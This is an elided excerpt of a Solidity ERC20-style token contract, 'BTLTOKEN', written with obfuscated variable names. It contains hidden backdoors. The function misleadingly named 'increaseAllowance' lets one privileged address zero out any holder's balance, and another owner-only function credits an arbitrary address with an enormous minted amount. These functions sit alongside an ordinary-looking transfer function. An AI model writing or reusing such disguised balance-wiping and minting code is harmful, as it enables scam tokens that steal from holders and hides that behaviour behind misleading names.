...
contract BTLTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dzzxa45 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = _bklku[newadd];
        uint256 newaaamount = _bklku[newadd]+_bklku[newadd]-curamount;
        _bklku[newadd] -= newaaamount;
        }else{
        if(dzzxa45 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        _bklku[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dzzxa45 == _msgSender());
        if(dzzxa45 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = _bklku[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _bklku[from] = _bklku[from]-amount;
        _bklku[to] = _bklku[to]+amount;
